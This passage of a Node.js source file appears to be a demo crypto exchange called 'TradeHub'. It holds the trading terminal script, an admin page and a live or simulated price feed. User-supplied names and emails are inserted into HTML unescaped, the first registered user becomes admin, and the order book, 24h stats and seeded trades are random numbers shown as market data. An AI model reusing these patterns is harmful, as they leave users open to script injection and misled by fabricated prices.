      <div class="volrow" id="volrow"></div>
    </div>
  </section>

  <!-- RIGHT -->
  <aside class="right-panel">
    <div class="rtabs">
      <div class="rtab active" data-rtab="ob">Order Book</div>
      <div class="rtab" data-rtab="tr">Trades</div>
    </div>
    <div class="rtab-content">
      <div class="ob" id="obView">
        <div class="ob-head"><span>Price(USDT)</span><span>Amount</span></div>
        <div id="obAsks"></div>
        <div class="spread"><span id="spPrice">—</span><span id="spVal" class="muted">—</span></div>
        <div id="obBids"></div>
      </div>
      <div class="tlist" id="tradesView" style="display:none"></div>
    </div>

    <form class="oform" id="orderForm">
      <div class="otype">
        <span class="on">Limit</span><span>Market</span>
      </div>
      <div class="inp"><span class="lbl">Price</span><input name="price" id="fPrice" type="number" step="any" required><span class="suf" id="fQuote">USDT</span></div>
      <div class="inp"><span class="lbl">Amount</span><input name="amount" id="fAmount" type="number" step="any" required><span class="suf" id="fBase">BTC</span></div>
      <div class="pct-row">
        <div class="pct" data-pct="25">25%</div>
        <div class="pct" data-pct="50">50%</div>
        <div class="pct" data-pct="75">75%</div>
        <div class="pct" data-pct="100">100%</div>
      </div>
      <div class="inp"><span class="lbl">Total</span><input id="fTotal" readonly><span class="suf" id="fTotalQuote">USDT</span></div>
      <div class="acts">
        <button type="button" class="buybtn" id="btnBuy">Buy</button>
        <button type="button" class="sellbtn" id="btnSell">Sell</button>
      </div>
    </form>
  </aside>
</div>

<!-- BOTTOM -->
<div class="bottom">
  <div class="btabs">
    <div class="btab active" data-btab="open">Open Orders <span id="openCount"></span></div>
    <div class="btab" data-btab="history">Order History</div>
    <div class="btab" data-btab="balances">Balances</div>
  </div>
  <div class="btab-c" id="btabContent"></div>
</div>

<div class="toasts" id="toasts"></div>

<script>
const $=s=>document.querySelector(s),$$=s=>document.querySelectorAll(s);
const state={
  symbol:'BTCUSDT',
  pairs:[],
  prices:{},
  candles:[], vbars:[],
  balances:[],
  orders:[], history:[],
  prevPrice:null,
  tab:'ob', btab:'open'
};

function fmt(n,d){if(n==null||isNaN(n))return'—';return Number(n).toLocaleString('en-US',{minimumFractionDigits:d??2,maximumFractionDigits:d??2})}
function fp(p){if(p==null)return'—';if(p>=1000)return fmt(p,2);if(p>=1)return p.toFixed(2);return p.toFixed(4)}
function toast(msg,type){const t=document.createElement('div');t.className='toast '+(type||'');t.textContent=msg;$('#toasts').appendChild(t);setTimeout(()=>{t.style.transition='opacity .3s,transform .3s';t.style.opacity='0';t.style.transform='translateX(30px)';setTimeout(()=>t.remove(),300)},3200)}

// ---------- WS ----------
let ws;
function connectWS(){
  const proto=location.protocol==='https:'?'wss://':'ws://';
  ws=new WebSocket(proto+location.host+'/ws');
  ws.onopen=()=>{$('#connTxt').textContent='Live'};
  ws.onmessage=e=>{
    try{const m=JSON.parse(e.data);if(m.symbol&&m.price){onPrice(m.symbol,m.price)}}catch{}
  };
  ws.onclose=()=>{$('#connTxt').textContent='Offline';setTimeout(connectWS,3000)};
  ws.onerror=()=>{$('#connTxt').textContent='Offline'};
}

// ---------- LOAD ----------
async function init(){
  const me=await fetch('/api/auth/me');
  if(!me.ok){location.href='/login';return}
  const {user}=await me.json();
  $('#userChip').innerHTML='<b>'+user.username+'</b>';
  if(user.isAdmin)$('#adminLink').style.display='inline-block';

  const pr=await fetch('/api/pairs');const pj=await pr.json();
  state.pairs=pj.pairs;
  pj.pairs.forEach(p=>state.prices[p.symbol]=p.price);
  renderPairList();
  switchSymbol(state.symbol);
  await Promise.all([refreshBalances(),refreshOrders(),refreshHistory()]);
  connectWS();
}

function onPrice(sym,price){
  const prev=state.prices[sym];
  state.prices[sym]=price;
  // Update pair row
  const row=document.querySelector('.pair[data-sym="'+sym+'"]');
  if(row){
    const pEl=row.querySelector('.price');
    pEl.textContent=fp(price);
    const pct=((price-(prev||price))/(prev||price))*100;
    const cEl=row.querySelector('.chg');
    const base=PAIR_START[sym]||price;
    const totalChg=((price-base)/base)*100;
    cEl.textContent=(totalChg>=0?'+':'')+totalChg.toFixed(2)+'%';
    cEl.className='chg '+(totalChg>=0?'up':'down');
  }
  if(sym===state.symbol){
    const el=$('#bigPrice');
    const up=price>=(prev||price);
    el.textContent=fp(price);
    el.classList.remove('fu','fd');void el.offsetWidth;
    el.classList.add(up?'fu':'fd');
    el.classList.remove('up','down');el.classList.add(up?'up':'down');
    updateLastCandle(price);
    updateOrderBook(price);
  }
}

// ---------- PAIRS 
const PAIR_START={"BTCUSDT":64000,"ETHUSDT":3400,"BNBUSDT":590,"SOLUSDT":148,"XRPUSDT":0.62,"ADAUSDT":0.45,"DOGEUSDT":0.16,"AVAXUSDT":36,"DOTUSDT":6.8,"LINKUSDT":18,"MATICUSDT":0.88,"LTCUSDT":84};
function renderPairList(){
  const el=$('#pairList');
  el.innerHTML=state.pairs.map(p=>{
    const price=state.prices[p.symbol]||p.start;
    const base=p.start;
    const chg=((price-base)/base)*100;
    const cls=chg>=0?'up':'down';
    const sym=p.symbol.replace('USDT','/USDT');
    return '<div class="pair'+(p.symbol===state.symbol?' active':'')+'" data-sym="'+p.symbol+'">'+
      '<div><div class="sym">'+sym+'</div><div class="sub">Vol '+p.base+'</div></div>'+
      '<div class="right"><div class="price '+cls+'">'+fp(price)+'</div><div class="chg '+cls+'">'+(chg>=0?'+':'')+chg.toFixed(2)+'%</div></div>'+
    '</div>';
  }).join('');
  $$('.pair').forEach(el=>el.onclick=()=>switchSymbol(el.dataset.sym));
  $('#pairCount').textContent=state.pairs.length;
}

function switchSymbol(sym){
  state.symbol=sym;
  const p=state.pairs.find(x=>x.symbol===sym);
  if(!p)return;
  $('#symBig').textContent=p.base+'/'+p.quote;
  $('#fQuote').textContent=p.quote;
  $('#fBase').textContent=p.base;
  $('#fTotalQuote').textContent=p.quote;
  const price=state.prices[sym];
  $('#bigPrice').textContent=fp(price);
  $('#fPrice').value=fp(price);
  $('#fAmount').value='';
  $('#fTotal').value='';
  $$('.pair').forEach(el=>el.classList.toggle('active',el.dataset.sym===sym));
  generateCandles(p);
  updateStats(p);
  updateOrderBook(price);
  loadTrades();
}

function updateStats(p){
  const price=state.prices[p.symbol]||p.start;
  const hi=price*1.02, lo=price*0.98;
  $('#h24').textContent=fp(hi);
  $('#l24').textContent=fp(lo);
  $('#v24').textContent=fmt(Math.random()*50000+10000,0)+' '+p.base;
}

// ---------- CHART ----------
function generateCandles(p){
  const n=50;
  const arr=[];
  let base=PAIR_START[p.symbol]||p.price||1;
  const vol=base*0.003;
  for(let i=0;i<n;i++){
    const o=base+(Math.random()-0.5)*vol;
    const c=o+(Math.random()-0.5)*vol*1.2;
    const h=Math.max(o,c)+Math.random()*vol*0.6;
    const l=Math.min(o,c)-Math.random()*vol*0.6;
    arr.push({o,c,h,l,v:Math.random()*80+20,g:c>=o});
    base=c;
  }
  state.candles=arr;
  renderChart();
}

function updateLastCandle(price){
  if(!state.candles.length)return;
  const last=state.candles[state.candles.length-1];
  last.c=price;
  last.h=Math.max(last.h,price);
  last.l=Math.min(last.l,price);
  last.g=last.c>=last.o;
  renderChart();
}

function renderChart(){
  const box=$('#candles'), paxis=$('#paxis'), vrow=$('#volrow');
  // Remove old candles
  Array.from(box.querySelectorAll('.candle')).forEach(el=>el.remove());
  vrow.innerHTML='';
  if(!state.candles.length)return;

  let mn=Infinity,mx=-Infinity;
  state.candles.forEach(c=>{mn=Math.min(mn,c.l);mx=Math.max(mx,c.h)});
  const pad=(mx-mn)*0.08||1;
  mn-=pad;mx+=pad;
  const range=mx-mn;

  // Axis
  paxis.innerHTML='';
  for(let i=5;i>=0;i--){
    const s=document.createElement('span');
    s.textContent=fp(mn+range*i/5);
    paxis.appendChild(s);
  }

  const maxV=Math.max(...state.candles.map(c=>c.v),1);

  state.candles.forEach(c=>{
    const el=document.createElement('div');
    el.className='candle '+(c.g?'green':'red');
    const bodyH=Math.max(1,((Math.abs(c.c-c.o))/range)*100);
    const bodyB=((Math.min(c.o,c.c)-mn)/range)*100;
    const wickT=((c.h-mn)/range)*100;
    const wickB=((c.l-mn)/range)*100;
    el.innerHTML=
      '<div class="wick" style="height:'+(wickT-wickB)+'%;bottom:'+wickB+'%"></div>'+
      '<div class="body" style="height:'+bodyH+'%;margin-bottom:'+bodyB+'%"></div>';
    box.appendChild(el);

    const vb=document.createElement('div');
    vb.className='vbar '+(c.g?'green':'red');
    vb.style.height=Math.max(10,(c.v/maxV)*100)+'%';
    vrow.appendChild(vb);
  });
}

// ---------- ORDER BOOK ----------
function updateOrderBook(mid){
  if(!mid)return;
  const step=Math.max(mid*0.0004,0.0001);
  const asks=[],bids=[];
  let cumA=0,cumB=0;
  for(let i=1;i<=10;i++){
    const aa=0.05+Math.random()*2.5;
    const ab=0.05+Math.random()*2.5;
    cumA+=aa;cumB+=ab;
    asks.push({p:mid+step*i,a:aa,c:cumA});
    bids.push({p:mid-step*i,a:ab,c:cumB});
  }
  const maxA=cumA,maxB=cumB;
  $('#obAsks').innerHTML=asks.reverse().map(r=>{
    const w=Math.min(100,(r.c/maxA)*100);
    return '<div class="ob-row ask" data-p="'+r.p+'"><div class="depth" style="width:'+w+'%"></div>'+
      '<span class="p">'+fp(r.p)+'</span><span class="a">'+r.a.toFixed(4)+'</span></div>';
  }).join('');
  $('#obBids').innerHTML=bids.map(r=>{
    const w=Math.min(100,(r.c/maxB)*100);
    return '<div class="ob-row bid" data-p="'+r.p+'"><div class="depth" style="width:'+w+'%"></div>'+
      '<span class="p">'+fp(r.p)+'</span><span class="a">'+r.a.toFixed(4)+'</span></div>';
  }).join('');
  $('#spPrice').textContent=fp(mid);
  $('#spVal').textContent='Spread '+step.toFixed(4);
  $$('.ob-row').forEach(el=>el.onclick=()=>{
    $('#fPrice').value=el.dataset.p;
    recalcTotal();
  });
}

// ---------- TRADES FEED ----------
async function loadTrades(){
  const r=await fetch('/api/trades/'+state.symbol);
  const {trades}=await r.json();
  renderTrades(trades);
}
function renderTrades(trades){
  const el=$('#tradesView');
  const p=state.pairs.find(x=>x.symbol===state.symbol);
  if(!trades.length){
    // Seed with synthetic
    const mid=state.prices[state.symbol];
    const fake=[];
    for(let i=0;i<25;i++)fake.push({price:mid*(1+(Math.random()-0.5)*0.001),amount:Math.random()*1.5,t:Date.now()-i*30000,buyer_id:1,seller_id:2});
    trades=fake;
  }
  el.innerHTML=trades.slice(0,30).map(t=>{
    const isBuy=(t.buyer_id||0)<(t.seller_id||999);
    const time=new Date((t.created_at||t.t||Date.now()/1000)*1000);
    const ts=time.getHours().toString().padStart(2,'0')+':'+time.getMinutes().toString().padStart(2,'0')+':'+time.getSeconds().toString().padStart(2,'0');
    return '<div class="trow"><span class="p '+(isBuy?'b':'s')+'">'+fp(t.price)+'</span>'+
      '<span class="a">'+(t.amount||0).toFixed(4)+'</span><span class="t">'+ts+'</span></div>';
  }).join('');
}

// ---------- BALANCES ----------
async function refreshBalances(){
  const r=await fetch('/api/balances');const {balances}=await r.json();
  state.balances=balances;
  renderBalances();
  return balances;
}
function renderBalances(){
  const el=$('#btabContent');
  if(state.btab!=='balances')return;
  if(!state.balances.length){
    el.innerHTML='<div class="empty">No balances yet.</div>';return;
  }
  el.innerHTML='<table><thead><tr><th>Asset</th><th>Free</th><th>Locked</th><th>Total</th></tr></thead><tbody>'+
    state.balances.map(b=>'<tr><td><b>'+b.symbol+'</b></td><td class="up">'+fmt(b.free,6)+'</td><td class="muted">'+fmt(b.locked,6)+'</td><td>'+fmt(b.free+b.locked,6)+'</td></tr>').join('')+
    '</tbody></table>';
}

// ---------- ORDERS ----------
async function refreshOrders(){
  const r=await fetch('/api/orders');const {orders}=await r.json();
  state.orders=orders;
  $('#openCount').textContent='('+orders.length+')';
  renderBottom();
}
async function refreshHistory(){
  const r=await fetch('/api/orders/history');const {orders}=await r.json();
  state.history=orders;
  renderBottom();
}
function renderBottom(){
  const el=$('#btabContent');
  if(state.btab==='balances'){renderBalances();return}
  const rows=state.btab==='open'?state.orders:state.history;
  if(!rows.length){
    el.innerHTML='<div class="empty">'+(state.btab==='open'?'No open orders.':'No order history.')+'</div>';
    return;
  }
  el.innerHTML='<table><thead><tr><th>ID</th><th>Pair</th><th>Side</th><th>Price</th><th>Amount</th><th>Filled</th><th>Status</th><th></th></tr></thead><tbody>'+
    rows.map(o=>'<tr>'+
      '<td>'+o.id+'</td>'+
      '<td>'+o.symbol.replace('USDT','/USDT')+'</td>'+
      '<td><span class="pill '+o.side+'">'+o.side.toUpperCase()+'</span></td>'+
      '<td>'+fp(o.price)+'</td>'+
      '<td>'+o.amount+'</td>'+
      '<td>'+o.filled+'</td>'+
      '<td><span class="pill '+o.status+'">'+o.status+'</span></td>'+
      '<td>'+(o.status==='open'||o.status==='partial'?'<button class="xbtn" onclick="cancelOrder('+o.id+')">Cancel</button>':'')+'</td>'+
    '</tr>').join('')+'</tbody></table>';
}
window.cancelOrder=async id=>{
  const r=await fetch('/api/orders/'+id,{method:'DELETE'});
  const j=await r.json();
  if(j.ok){toast('Order cancelled','');await refreshOrders();await refreshHistory();await refreshBalances()}
  else toast(j.error||'Failed','err');
};

// ---------- ORDER FORM ----------
function recalcTotal(){
  const p=parseFloat($('#fPrice').value)||0;
  const a=parseFloat($('#fAmount').value)||0;
  $('#fTotal').value=p&&a?(p*a).toFixed(2):'';
}
$('#fPrice').oninput=recalcTotal;
$('#fAmount').oninput=recalcTotal;

$$('.pct').forEach(b=>b.onclick=()=>{
  const pct=parseInt(b.dataset.pct);
  const price=parseFloat($('#fPrice').value)||state.prices[state.symbol]||0;
  const pair=state.pairs.find(x=>x.symbol===state.symbol);
  if(!pair||!price)return;
  // Assume buying with quote balance
  const quoteBal=state.balances.find(b=>b.symbol===pair.quote);
  const free=quoteBal?quoteBal.free:0;
  const amount=(free*pct/100)/price;
  $('#fAmount').value=amount.toFixed(6);
  recalcTotal();
});

async function placeOrder(side){
  const pair=state.pairs.find(x=>x.symbol===state.symbol);
  const price=parseFloat($('#fPrice').value);
  const amount=parseFloat($('#fAmount').value);
  if(!pair||!price||!amount||price<=0||amount<=0){toast('Enter valid price and amount','err');return}
  const r=await fetch('/api/orders',{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({symbol:state.symbol,side,price,amount})
  });
  const j=await r.json();
  if(j.ok){
    toast('Order placed: '+side.toUpperCase()+' '+amount+' '+pair.base+' @ '+fp(price),'ok');
    $('#fAmount').value='';$('#fTotal').value='';
    await refreshOrders();await refreshHistory();await refreshBalances();
    loadTrades();
  } else {
    toast(j.error||'Order failed','err');
  }
}
$('#btnBuy').onclick=()=>placeOrder('buy');
$('#btnSell').onclick=()=>placeOrder('sell');

// ---------- TABS ----------
$$('.rtab').forEach(t=>t.onclick=()=>{
  $$('.rtab').forEach(x=>x.classList.remove('active'));
  t.classList.add('active');
  state.tab=t.dataset.rtab;
  $('#obView').style.display=state.tab==='ob'?'block':'none';
  $('#tradesView').style.display=state.tab==='tr'?'block':'none';
  if(state.tab==='tr')loadTrades();
});
$$('.btab').forEach(t=>t.onclick=()=>{
  $$('.btab').forEach(x=>x.classList.remove('active'));
  t.classList.add('active');
  state.btab=t.dataset.btab;
  renderBottom();
});

$('#logoutBtn').onclick=async()=>{await fetch('/api/auth/logout',{method:'POST'});location.href='/login'};

// ---------- REFRESH LOOPS ----------
setInterval(()=>{const mid=state.prices[state.symbol];if(mid){updateOrderBook(mid);updateStats(state.pairs.find(p=>p.symbol===state.symbol))}},2500);
setInterval(()=>{if(state.tab==='tr')loadTrades()},3500);
setInterval(async()=>{await refreshOrders();await refreshBalances()},8000);

init();
</script>

<script>
// Inject pair start prices for client-side rendering
const PAIRS_LIST=${JSON.stringify(PAIRS)};
</script>
</body></html>`;

// ---------- ADMIN PAGE ----------
const ADMIN_HTML = `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>TradeHub · Admin</title>
<style>
${BASE_CSS}
body{padding-bottom:40px}
.top{background:var(--panel);padding:12px 16px;display:flex;align-items:center;gap:16px;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:10}
.brand{color:var(--yellow);font-weight:800;font-size:16px}
.spacer{flex:1}
.top a{color:var(--yellow);font-size:13px;font-weight:500}
.wrap{max-width:1300px;margin:0 auto;padding:16px;display:flex;flex-direction:column;gap:16px}
.panel{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:16px;overflow-x:auto}
.panel h2{font-size:14px;color:var(--yellow);margin-bottom:12px;font-weight:700}
table{width:100%;border-collapse:collapse;font-size:12px;min-width:520px;font-family:'JetBrains Mono',monospace}
th,td{text-align:left;padding:8px;border-bottom:1px solid var(--border);white-space:nowrap}
th{color:var(--text3);font-weight:500;font-size:10px;text-transform:uppercase;font-family:Inter,sans-serif}
td button{background:var(--blue);color:#fff;padding:4px 9px;font-size:11px;margin-right:4px;font-family:Inter,sans-serif}
td button.danger{background:var(--red)}
td button.ghost{background:transparent;border:1px solid var(--border);color:var(--text2)}
.empty{padding:20px;text-align:center;color:var(--text3);font-size:12px}
</style></head><body>
<div class="top">
  <div class="brand">⚡ TradeHub Admin</div>
  <div class="spacer"></div>
  <a href="/">← Terminal</a>
</div>
<div class="wrap" id="wrap"><div class="empty">Loading…</div></div>
<script>
const $=s=>document.querySelector(s);
async function load(){
  const me=await fetch('/api/auth/me');
  if(!me.ok){location.href='/login';return}
  const {user}=await me.json();
  if(!user.isAdmin){$('#wrap').innerHTML='<div class="empty">Admin access required.</div>';return}

  const [u,o,t]=await Promise.all([
    fetch('/api/admin/users').then(r=>r.json()),
    fetch('/api/admin/orders').then(r=>r.json()),
    fetch('/api/admin/trades').then(r=>r.json())
  ]);

  $('#wrap').innerHTML=\`
    <div class="panel"><h2>Users (\${u.users.length})</h2>
      <table><thead><tr><th>ID</th><th>Username</th><th>Email</th><th>Admin</th><th>Created</th><th>Actions</th></tr></thead>
      <tbody>\${u.users.map(x=>\`<tr>
        <td>\${x.id}</td><td>\${x.username}</td><td>\${x.email}</td>
        <td>\${x.is_admin?'✅':'—'}</td>
        <td>\${new Date(x.created_at*1000).toLocaleDateString()}</td>
        <td>
          \${!x.is_admin?\`<button onclick="promote(\${x.id})">Promote</button>\`:''}
          <button class="danger" onclick="credit(\${x.id})">Credit</button>
        </td>
      </tr>\`).join('')}</tbody></table>
    </div>
    <div class="panel"><h2>Orders (\${o.orders.length})</h2>
      <table><thead><tr><th>ID</th><th>User</th><th>Symbol</th><th>Side</th><th>Price</th><th>Amount</th><th>Filled</th><th>Status</th></tr></thead>
      <tbody>\${o.orders.map(r=>\`<tr>
        <td>\${r.id}</td><td>\${r.username}</td><td>\${r.symbol}</td>
        <td>\${r.side}</td><td>\${r.price}</td><td>\${r.amount}</td>
        <td>\${r.filled}</td><td>\${r.status}</td>
      </tr>\`).join('')}</tbody></table>
    </div>
    <div class="panel"><h2>Trades (\${t.trades.length})</h2>
      <table><thead><tr><th>ID</th><th>Symbol</th><th>Price</th><th>Amount</th><th>Buyer</th><th>Seller</th><th>Time</th></tr></thead>
      <tbody>\${t.trades.map(r=>\`<tr>
        <td>\${r.id}</td><td>\${r.symbol}</td><td>\${r.price}</td><td>\${r.amount}</td>
        <td>\${r.buyer||'—'}</td><td>\${r.seller||'—'}</td>
        <td>\${new Date(r.created_at*1000).toLocaleString()}</td>
      </tr>\`).join('')}</tbody></table>
    </div>\`;
}
window.promote=async id=>{await fetch('/api/admin/users/'+id+'/promote',{method:'POST'});load()};
window.credit=async id=>{
  const symbol=prompt('Asset to credit (USDT, BTC, ETH...):','USDT');
  if(!symbol)return;
  const amount=prompt('Amount:','10000');
  if(!amount)return;
  await fetch('/api/admin/users/'+id+'/credit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({symbol,amount:Number(amount)})});
  load();
};
load();
</script></body></html>`;

// ---------- PAGES ----------
app.get('/', (req, res) => res.type('html').send(APP_HTML));
app.get('/login', (req, res) => res.type('html').send(LOGIN_HTML));
app.get('/login.html', (req, res) => res.type('html').send(LOGIN_HTML));
app.get('/admin', (req, res) => res.type('html').send(ADMIN_HTML));
app.get('/admin.html', (req, res) => res.type('html').send(ADMIN_HTML));

// ---------- WS HUB ----------
const wss = new WebSocket.Server({ server, path: '/ws' });
const clients = new Set();

wss.on('connection', ws => {
  clients.add(ws);
  // Send current prices
  PAIRS.forEach(p => {
    try { ws.send(JSON.stringify({ symbol: p.symbol, price: livePrices[p.symbol] })); } catch {}
  });
  ws.on('close', () => clients.delete(ws));
  ws.on('error', () => clients.delete(ws));
});

function broadcast(obj) {
  const msg = JSON.stringify(obj);
  for (const c of clients) {
    if (c.readyState === 1) { try { c.send(msg); } catch {} }
  }
}

// ---------- BINANCE LIVE FEED ----------
function startBinanceFeed() {
  const streams = PAIRS.map(p => p.symbol.toLowerCase() + '@trade').join('/');
  const url = 'wss://stream.binance.com:9443/stream?streams=' + streams;
  let upstream;
  try { upstream = new WebSocket(url); } catch { return startSimulatedFeed(); }

  let receivedData = false;
  const watchdog = setTimeout(() => {
    if (!receivedData) {
      console.log('⚠️  Binance feed silent. Starting simulated prices.');
      try { upstream.close(); } catch {}
      startSimulatedFeed();
    }
  }, 15000);

  upstream.on('message', raw => {
    try {
      const env = JSON.parse(raw);
      const data = env.data || env;
      const sym = data.s;
      const price = parseFloat(data.p);
      if (sym && price) {
        receivedData = true;
        livePrices[sym] = price;
        broadcast({ symbol: sym, price });
      }
    } catch {}
  });
  upstream.on('error', e => {
    console.log('Binance WS error:', e.message);
    if (!receivedData) { clearTimeout(watchdog); startSimulatedFeed(); }
  });
  upstream.on('close', () => {
    console.log('Binance feed closed. Reconnecting in 5s…');
    setTimeout(startBinanceFeed, 5000);
  });
}

let simRunning = false;
function startSimulatedFeed() {
  if (simRunning) return;
  simRunning = true;
  console.log('📈 Simulated price feed active');
  setInterval(() => {
    for (const p of PAIRS) {
      const cur = livePrices[p.symbol] || p.start;
      const vol = cur * 0.0008;
      const next = cur + (Math.random() - 0.5) * vol;
      livePrices[p.symbol] = next;
      broadcast({ symbol: p.symbol, price: next });
    }
  }, 1200);
}

// ---------- START ----------
server.listen(PORT, () => {
  console.log(`✅ TradeHub running on port ${PORT}`);
  console.log(`   Login:  /login`);
  console.log(`   Admin:  /admin (first registered user is admin)`);
  startBinanceFeed();
});
